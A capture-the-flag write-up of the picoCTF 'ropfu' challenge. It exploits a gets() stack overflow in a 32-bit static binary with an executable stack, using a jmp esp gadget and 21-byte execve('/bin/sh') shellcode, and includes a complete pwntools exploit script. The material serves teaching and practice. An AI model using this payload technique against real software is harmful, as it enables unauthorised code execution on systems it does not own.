# CyLab — ropfu

* **Platform:** CyLab Security Academy / picoCTF 2022 (Challenge ID: `292`)
* **Category:** Binary Exploitation / Shellcode & Stack Execution (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, ROPgadget
* **Binary:** `vuln` (32-bit x86 static ELF)

---

## TL;DR

Despite its name suggesting complex Return-Oriented Programming (ROP), inspection reveals that the statically linked binary was compiled without a `GNU_STACK` ELF header, leaving the runtime stack completely executable (**NX disabled**). The binary contains an unbounded stack buffer overflow via `gets(buf)` into a 16-byte buffer with a return address offset of 28 bytes. Instead of constructing an extensive ROP chain, we hijack control flow using a static `jmp esp` gadget located at `0x08095af7`. Placing standard 32-bit `execve("/bin/sh")` shellcode immediately following the gadget triggers instant execution and yields an interactive shell.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Key observations:
1. **NX Disabled (RWX Stack):** The operating system maps the stack segment with Read, Write, and Execute permissions.
2. **Static Binary:** Statically linked binaries embed vast code libraries, providing thousands of gadgets including `jmp esp` / `call esp`.
3. **No Canary in `vuln()`:** Although `checksec` flags canary symbols in the binary (due to static libc linking), the specific target function `vuln()` lacks stack canary protection.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln() {
    char buf[16];
    printf("How does pwn fu connect to your brain? ");
    gets(buf);      // VULNERABILITY: Unbounded gets() writes past 16-byte buffer
}

int main() {
    vuln();
    return 0;
}
```

### 2. Disassembly & Stack Layout

Disassembling `vuln` in GDB:

```asm
0x08049db5 <+0>:     push   ebp
0x08049db6 <+1>:     mov    ebp, esp
0x08049db8 <+3>:     sub    esp, 0x18
0x08049dbb <+6>:     sub    esp, 0xc
0x08049dbe <+9>:     push   0x80a310c           ; "How does pwn fu..."
0x08049dc3 <+14>:    call   0x8051280 <printf>
...
0x08049dd5 <+32>:    lea    eax, [ebp-0x10]     ; buf is located at ebp-0x10 (16 bytes)
0x08049dd8 <+35>:    push   eax
0x08049dd9 <+36>:    call   0x8050e60 <gets>
0x08049dde <+41>:    leave
0x08049ddf <+42>:    ret
```

Offset calculation:
$$\text{Offset to Return Address} = 16 \text{ bytes (buf)} + 8 \text{ bytes (alignment padding)} + 4 \text{ bytes (saved EBP)} = 28 \text{ bytes}$$

### 3. Locating `jmp esp` Gadget

Using `ROPgadget`:

```text
$ ROPgadget --binary vuln | grep ": jmp esp"
0x08095af7 : jmp esp
```

### 4. Control-Flow Execution Diagram

```text
       Lower Addresses
  +----------------------------------+  [ebp - 0x10]
  |          buf[16]                 |  "A" * 16
  +----------------------------------+  [ebp]
  |       Saved EBP (4 bytes)        |  "A" * 12
  +----------------------------------+  [ebp + 0x04]
  |      Saved EIP (4 bytes)         |  0x08095af7 (<jmp esp>)
  +----------------------------------+  <-- ESP upon RET execution
  |   Injected Shellcode (21 bytes)  |  \x31\xc9\xf7\xe1\x51\x68...
  +----------------------------------+
       Higher Addresses
```

When `ret` pops `0x08095af7` into `EIP`, `ESP` points directly at the start of our shellcode. The `jmp esp` instruction jumps directly into this address, executing the shellcode without needing an ASLR leak.

---

## Dynamic Analysis & Exploitation Strategy

1. **Crafting Shellcode:**
   We use standard compact 32-bit `execve("/bin/sh", 0, 0)` Linux shellcode:
   ```asm
   xor ecx, ecx
   mul ecx
   push ecx
   push 0x68732f2f      ; "//sh"
   push 0x6e69622f      ; "/bin"
   mov ebx, esp
   mov al, 0xb          ; __NR_execve
   int 0x80
   ```
2. **Payload Construction:**
   ```python
   payload = b"A" * 28 + p32(0x08095af7) + shellcode
   ```
3. **Execution:**
   Send the payload, wait for shell readiness, and execute `cat flag.txt`.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33405
JMP_ESP = 0x08095af7

# 21-byte execve("/bin/sh", NULL, NULL) Linux x86 shellcode
SHELLCODE = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

def solve(io):
    io.recvuntil(b"brain? ")

    # 28 bytes padding + jmp esp gadget + shellcode
    payload = b"A" * 28 + p32(JMP_ESP) + SHELLCODE
    io.sendline(payload)

    # Shell is now active
    io.sendline(b"cat flag.txt")
    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./vuln") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33405: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33405
```

---

## Key Takeaways & Lessons

1. **Verify Binary NX Status First:** Before spending hours assembling ROP chains for static binaries, always inspect `checksec` and ELF headers (`readelf -l`) for `GNU_STACK`. If stack execution is permitted, a simple trampoline (`jmp esp`) bypasses the need for complex gadgets.
2. **The `jmp esp` Trampoline Pattern:** Because `ret` leaves `ESP` pointing directly to the memory slot after the saved return address, jumping to `esp` executes trailing payloads without requiring stack address disclosures or defeating ASLR.
3. **Static Binary Canary False Positives:** Automated scanners frequently report "Canary found" on static binaries because libc startup code includes canary management functions. Always verify whether the vulnerable function actually calls `__stack_chk_fail`.
